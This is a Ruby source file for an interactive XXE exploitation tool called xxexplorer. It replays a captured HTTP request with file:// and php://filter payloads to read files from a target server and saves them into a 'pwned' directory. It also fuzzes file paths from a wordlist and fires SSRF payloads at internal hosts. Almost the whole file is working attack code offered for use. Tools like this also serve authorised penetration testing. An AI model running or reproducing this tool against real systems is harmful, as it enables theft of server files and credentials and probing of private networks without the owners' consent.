#!/usr/bin/env ruby

require 'colorize'
require 'optparse'
require 'net/http'
require 'net/https'
require 'fileutils'
require 'timeout'
require 'find'
require 'cgi'
require 'highline/import'

logo = '
██╗  ██╗██╗  ██╗███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██████╗ ███████╗██████╗  
╚██╗██╔╝╚██╗██╔╝██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██╔══██╗██╔════╝██╔══██╗ 
 ╚███╔╝  ╚███╔╝ █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██████╔╝█████╗  ██████╔╝ 
 ██╔██╗  ██╔██╗ ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██╔══██╗██╔══╝  ██╔══██╗ 
██╔╝ ██╗██╔╝ ██╗███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║  ██║███████╗██║  ██║ 
╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝.rb
'.red

options = {:file => nil, :wordlist => nil, :phprce => nil, :https => false, :blindResponses => nil, :schema => "http", :port => 80, :urlencode => false, :delay => 0, :hosts => nil, :payloads => nil, :encode => false }

parser = OptionParser.new do|opts|
    opts.banner = "\nUsage: xxexplorer.rb [options]"

    opts.on('-f', '--file /path/to/file', '*Mandatory* File with XXE request (from burp), use [PLACEHOLDER]'.red) do |file|
        options[:file] = file
    end

    opts.on('-w', '--wordlist /path/to/wordlist', 'To attempt to retrieve the contents of the files (Fuzzying)') do |wordlist|
        options[:wordlist] = wordlist
    end

    opts.on('--phprce', 'XXE PHP Module') do |phprce|
        options[:phprce] = "yes"
    end
    
    opts.on('-p', '--port 8080', 'Different port') do |port|
        options[:port] = port
    end

    opts.on('-e', '--phpencode', 'Encode using php://filter/convert.base64-encode/resource=') do |encode|
        options[:encode] = "true"
    end

    opts.on('-u', '--urlencode', 'Encode placeholder payloads') do |urlencode|
        options[:urlencode] = true
    end

    opts.on('-s', '--https', 'enable HTTPS') do |https|
        options[:https] = "yes"
        options[:schema] = "https"
        options[:port] = "443"
    end

    opts.on('-b', '--oob http://site.com/', 'XXE Out-of-band exploitation module(xxeserve)') do |oob|
        options[:oob] = oob
    end

    opts.on('-d n', '--delay', 'Requests delay in seconds') do |delay|
        options[:delay] = delay
    end

    opts.on('--ssrf', '--ssrf /path/to/hosts', 'SSRF Exploitation using payload file') do |hosts|
        options[:hosts] = hosts
    end

    opts.on('--payloads', '--payloads /path/to/payloads.list', 'Payloads file to SSRF Exploitation') do |payloads|
        options[:payloads] = payloads
    end

    opts.on('-h', '--help', 'Displays Help') do
        puts opts
        exit
    end

end

parser.parse!

if options[:file] == nil
    print logo
    puts "#{parser}\n"
    exit
else 
    begin 
    requestFile = File.open(options[:file], "r")
    requestData = requestFile.read
    requestFile.close 
    rescue 
    puts "[Error] File #{options[:file]} not found".red
    exit
    end
end

if options[:wordlist] != nil
    begin 
    wordlistFile = File.open(options[:wordlist], "r")
    wordlistData = wordlistFile.read
    wordlistFile.close 
    rescue 
    puts "[Error] File #{options[:wordlist]} not found".red
    exit
    end
end

if options[:hosts] != nil
    if File.exist?(options[:hosts])
        hostsFile = File.open(options[:hosts], "r")
        hostsData = hostsFile.read
        hostsFile.close
    else
        puts "[-] #{options[:hosts]}:".red + " No such file or directory"
        exit
    end
end

if options[:payloads] != nil
    if File.exist?(options[:payloads])
        payloadsFile = File.open(options[:payloads], "r")
        payloadsData = payloadsFile.read
        payloadsFile.close
    else
        puts "[-] #{options[:payloads]}:".red + " No such file or directory"
        exit
    end
else
    payloadsFile = File.open("./payloads.list", "r")
    payloadsData = payloadsFile.read
    payloadsFile.close
end

if options[:oob] != nil 
    handler = options[:oob]
end

def saveHistory(cmdToSave)
    open($historyFile, 'a') do |content|
        if cmdToSave != "" 
            content << "#{cmdToSave}\n"
        end
    end
end

def getHistory
    histFile = File.open("#{$historyFile}", "r")
    histData = histFile.read
    histFile.close
    return histData
end

def getPath(data)
    data.each_line do |line|
        break if line == "\n"
        if line =~ /POST/ 
            return line.split(" ")[1]
        end
    end
end

def getHost(data)
    data.each_line do |line|
        break if line == "\n"
        if line =~ /Host: / 
            host = line.split(":")[1].split(" ")[0]
            # Get port from host field
            if line.split(":").length > 2 && line.split(":")[2].split(" ")[0] != $port
                $port = line.split(":")[2].split(" ")[0]
            end
            return host
        end
    end
end

# Function to create a header to request
def buildHeader(data, headerHash = {})
    headerFieldContent = ""
    headerField = ""
    data.each_line do |line|
        break if line == "\n"
        if line =~ /POST/
            next
        elsif line =~ /Host: /
            next
        else          
            headerField = line.split(" ")[0].gsub!(/:/,"")          
            (line.split(" ").length - 1).times do |i|
                headerFieldContent = "#{headerFieldContent}" + "#{line.split(" ")[i + 1]} "
            end
            #req.add_field("X-Forwarded-For", "0.0.0.0")
            headerHash["#{headerField}"] = "#{headerFieldContent}"
            #requestHeader.add_field("#{headerField}", "#{headerFieldContent}".gsub(/\s+/, ' '))
            headerFieldContent = nil
        end     
    end
end

# Function to get the body of 
def getDataPayload(data)
    body = ""
    count = 0
    data.each_line do |line|    
        if line != "\n" && count == 0
            next
        elsif line == "\n" && count == 0
            count = 1
        else
            body = "#{body}" + "#{line}"
        end
    end
    return body
end

def saveContent(content, name)
    FileUtils.mkdir_p("#{$directory}#{File.dirname(name)}") unless File.exists?("#{$directory}#{File.dirname(name)}")
    out_file = File.new("#{$directory}#{name}", "w")
    out_file.puts(content)
    out_file.close
end
   
# Parsing resource file to gerenate the request
$ssl = options[:https]
wordlist = options[:wordlist]
internalHosts = options[:hosts]
delay = options[:delay].to_i
$port = options[:port]
$host = getHost(requestData)
$directory = "./pwned/#{$host}"
$historyFile = "history"
schemas = ["http://", "https://"] #array.each { |x| puts x }
path = getPath(requestData)
base64EncPay = "php://filter/read=convert.base64-encode/resource="
encode = options[:encode]
header = {}
buildHeader(requestData, header)
data = getDataPayload(requestData)
$urlencode = options[:urlencode]
#-----------------------------------------------
$http = Net::HTTP.new($host, $port)
$http.use_ssl = $ssl
$request = Net::HTTP::Post.new(path, header)
#-------------------------------------------

def serverRequest(dataRequest, replacePayload, schema="file://")
    if $urlencode == true
       newData = dataRequest.gsub(/\[PLACEHOLDER\]/, CGI.escape("#{schema}#{replacePayload}".chomp))
    else 
       newData = dataRequest.gsub(/\[PLACEHOLDER\]/, "#{schema}#{replacePayload}".chomp)
    end
    
    $request.body = newData
    begin
        response = $http.request($request)
        response.body
    rescue
        puts "[Error]".red + " - There is something wrong with your conectivity"
    end
end

Dir.mkdir($directory) unless File.exists?($directory)

# These requests will be used to compare 

if $urlencode == true

    notfoundEncoded = serverRequest(data, "/2e1afrer44.txt")
    $urlencode = false
    notfoundNotEncoded = serverRequest(data, "/2e1afrer44.txt")
    $urlencode = true

else

    notfoundNotEncoded = serverRequest(data, "/2e1afrer44.txt")
    $urlencode = true
    notfoundEncoded = serverRequest(data, "/2e1afrer44.txt")
    $urlencode = false
    
end

# Interactive shell

mainHelp = <<END
    -----------------------
    [+] Available commands:
    -------------------------------------------------------------------------------------
    |            exit ....: Program exit                                                |
    |            show ....: Display all variables                                       |
    |              ls ....: Display files already get from server                       |
    |            fuzz ....: Fuzzying module, will try get files from wordlist           |
    |            ssrf ....: Try to exploit internal hosts using payloads.list content   |
    |    payloads <path>..: Set a diferent payloads.list to be used in SSRF attack      |
    |     ssl (yes/no)....: Enable/Disable HTTPS requests to host                       |
    |    encode (yes/no)..: Enable/Disable base64 encoded requests to host (PHP)        |
    |    urlenc (yes/no)..: Enable/Disable URL encoded placeholder payloads             |
    |     delay <sec> ....: Set a delay to requests                                     |
    |      cat <file> ....: Show remote file content                                    |
    |     lcat <file> ....: Show local file content                                     |
    |         history ....: Show command history                                        |
    -------------------------------------------------------------------------------------
END

while true
    print "xxe@[".yellow + $host + "]$ ".yellow
    inputUser = $stdin.gets.chomp
    saveHistory(inputUser)
    splitedCommad = inputUser.split(" ")
    if encode == true
        schemaFileReq = "#{base64EncPay}file://"
    else
        schemaFileReq = "file://"
    end

    case splitedCommad[0]
        when "exit"
            exit

        when "help"
            puts "\n#{mainHelp}\n".yellow

        when "history"
            puts getHistory

        when "show"
            puts ""
            puts " Delay.............: ".green + "#{delay}".red
            puts " payloads File.....: ".green + "#{payloadsFile.path}".red
            puts " Directory files...: ".green + "#{$directory}".red
            puts " Server............: ".green + "#{options[:schema]}://#{$host}#{path}".red
            puts " SSL Enabled.......: ".green + "#{$ssl}".red
            puts " PHP base64-enc....: ".green + "#{encode}".red
            puts " UREncode payloads.: ".green + "#{$urlencode}".red
            puts ""

        when "ls"
            if splitedCommad[1] != nil
                dirContent = Dir["#{$directory}#{splitedCommad[1]}*"]
                dirContent.each do |content|
                    if File.directory?(content)
                        puts content.match(/#{$directory}(.*)/)[1].yellow
                    else
                        puts content.match(/#{$directory}(.*)/)[1].red
                    end
                end
            else
                dirContent = Dir["#{$directory}/*"]
                dirContent.each do |content|
                    if File.directory?(content)
                        puts content.match(/#{$directory}(.*)/)[1].yellow
                    else
                        puts content.match(/#{$directory}(.*)/)[1].red
                    end
                end
            end
        when "payloads"
            if splitedCommad[1] == nil
                puts "[-] payloads: " + "The file must be set"
            else
                if File.exists?("#{splitedCommad[1]}")
                    payloadsFile = File.open("#{splitedCommad[1]}", "r")
                    payloadsData = payloadsFile.read
                    payloadsFile.close
                else
                    puts "[-] payloads: "+ "#{splitedCommad[1]}:".red + " No such file or directory"
                end
            end

        when "delay"
            delay = splitedCommad[1].to_i
            puts "The delay has been set to " + "#{splitedCommad[1]}".yellow + " seconds"

        when "encode"
            if splitedCommad[1] == "yes"
                encode = true
                puts "Base64 encode has been enabled".yellow
            elsif splitedCommad[1] == "no"
                encode = false
                puts "Base64 encode has been disabled".yellow
            end

        when "ssl"
            if splitedCommad[1] == "yes"
                $http.use_ssl = true
                $ssl = true
                puts "HTTPS has been enabled".yellow
            elsif splitedCommad[1] == "no"
                $http.use_ssl = false
                $ssl = false
                puts "HTTPS has been disabled".yellow
            end

        when "urlenc"
            if splitedCommad[1] == "yes"
                $urlencode = true
                puts "URLEncode has been enabled".yellow
            elsif splitedCommad[1] == "no"
                $urlencode = false
                puts "URLEncode has been disabled".yellow
            end

        when "cat"
            cmdResp = serverRequest(data, splitedCommad[1], schemaFileReq)
            if !cmdResp.nil?
                if cmdResp == notfoundEncoded || cmdResp == notfoundNotEncoded || cmdResp.match(/#{schemaFileReq}#{splitedCommad[1]}/i) || cmdResp.match(/file%3A\/\/#{splitedCommad[1]}/i)
                    puts "[-] cat: "+ "#{splitedCommad[1]}:".red + " No such file or directory"
                else
                    saveContent(cmdResp, "#{splitedCommad[1]}")
                    puts cmdResp.red
                    puts "----------------------"

                end
            end

        when "lcat"
            if splitedCommad[1] == nil
                puts "[-] lcat: " + "The file must be set"
            else
                if File.exists?("#{$directory}#{splitedCommad[1]}")
                    localFile = File.open("#{$directory}#{splitedCommad[1]}", "r")
                    puts localFile.read
                    localFile.close
                else
                    puts "[-] lcat: "+ "#{splitedCommad[1]}:".red + " No such file or directory"
                end
            end

        when "fuzz"
            if wordlist == nil
                print "You need to set the wordlist, do you want type now? [y/n]: ".yellow
                inputUser = $stdin.gets.chomp
                if inputUser == "n"
                    next
                elsif inputUser == "y"
                    print "Path to wordlist = ".yellow
                    inputUser = $stdin.gets.chomp
                    if File.exist?(inputUser)
                        wordlist = inputUser
                        requestFile = File.open(inputUser, "r")
                        requestData = requestFile.read
                        requestFile.close
                    else   
                        puts "[-] #{inputUser}:".red + " No such file or directory"
                        next
                    end
                end
            end    
            begin 
                requestData.each_line do |line|
                    cmdResp = serverRequest(data, line.chomp, schemaFileReq)
                    if cmdResp == notfoundEncoded || cmdResp == notfoundNotEncoded || cmdResp.match(/#{line}/) || cmdResp.match(/file%3A\/\/#{splitedCommad[1]}/i)
                        puts "[FAILED] -> ".red + "#{line.chomp}".red
                    else
                        saveContent(cmdResp, "#{line.chomp}")
                        puts " [SAVED] -> ".green + "#{line.chomp}".white
                    end
                    sleep delay
                end
            rescue Interrupt
                puts "Stoping.......".yellow + "[OK]".green
            end

        when "ssrf"
            if internalHosts == nil
                print "You need to set hosts file, do you want type now? [y/n]: ".yellow
                inputUser = $stdin.gets.chomp
                if inputUser == "n"
                    next
                elsif inputUser == "y"
                    print "Path to hosts file = ".yellow
                    inputUser = $stdin.gets.chomp
                    if File.exist?(inputUser)
                        internalHosts = inputUser
                        hostsFile = File.open(inputUser, "r")
                        hostsData = hostsFile.read
                        hostsFile.close
                    else
                        puts "[-] #{inputUser}:".red + " No such file or directory"
                        next
                    end
                end
            end
            begin
                counter = 0
                threads = []
                hostsData.each_line do |line|
                    schemas.each do |schema|
                        payloadsData.each_line do |payload|
                            threads[counter] = Thread.new{serverRequest(data, "#{line.chomp}#{payload}", schema)}
                            threads[counter].join(1)
                            counter += 1
                            puts "[REQUEST] -> ".red + "#{schema}#{line.chomp}#{payload}".red
                            sleep delay
                        end
                    end
                end
            rescue Interrupt
                puts "Stoping.......".yellow + "[OK]".green
            end
        else
            next
        end
end
